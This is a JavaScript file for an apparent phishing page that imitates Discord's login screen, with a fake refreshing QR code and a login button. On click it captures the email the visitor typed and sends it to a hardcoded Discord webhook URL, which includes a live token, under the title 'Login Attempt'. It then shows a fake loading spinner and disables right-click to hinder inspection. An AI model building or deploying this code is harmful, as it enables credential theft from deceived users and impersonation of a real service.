// ==================================
// DISCORD WEBHOOK
// ==================================
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs";

// ==================================
// CONFIG
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.querySelector('input[type="email"]'),
};

// ==================================
// UTILITY FUNCTIONS
// ==================================

/**
 * Generates a random alphanumeric string
 */
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  return Array.from({ length }, () =>
    characters.charAt(Math.floor(Math.random() * characters.length))
  ).join("");
};

/**
 * Creates an HTML element from a string
 */
const createElementFromHTML = (html) => {
  const template = document.createElement("template");
  template.innerHTML = html.trim();
  return template.content.firstChild;
};

/**
 * Sends email to Discord webhook
 */
const sendEmailToDiscord = async (email) => {
  if (!email) return;

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title: "Login Attempt",
            color: 0x5865f2,
            fields: [{ name: "Email", value: email }],
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });
  } catch (error) {
    console.error("Webhook error:", error);
  }
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;

      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");

      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svgElement;
    } catch (error) {
      console.error("QR error:", error);
      return null;
    }
  },

  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = this.getSpinnerMarkup();
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";

    const qr = this.generate(
      \`https://discord.com/ra/\${generateRandomString()}\`
    );

    if (qr) DOM.qrCodeContainer.appendChild(qr);

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      \`<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">\`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    setInterval(
      () => this.simulateRefresh(),
      CONFIG.QR_REFRESH_INTERVAL
    );
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `
      <span class="spinner">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  applyAnimationDelays() {
    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
      item.style.animation = \`spinner-pulsing-ellipsis 1.4s infinite ease-in-out \${i *
        CONFIG.ELLIPSIS_DELAY_INCREMENT}s\`;
    });
  },

  showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.disabled = true;
    this.applyAnimationDelays();

    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
  },

  reset() {
    if (!DOM.loginButton) return;

    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.disabled = false;
  },

  init() {
    if (!DOM.loginButton) return;

    DOM.loginButton.addEventListener("click", (e) => {
      e.preventDefault();

      const email = DOM.emailInput?.value?.trim();
      if (email) sendEmailToDiscord(email);

      this.showLoading();
    });
  },
};

// ==================================
// INIT
// ==================================
const init = () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener("contextmenu", (e) => e.preventDefault());
};

document.readyState === "loading"
  ? document.addEventListener("DOMContentLoaded", init)
  : init();
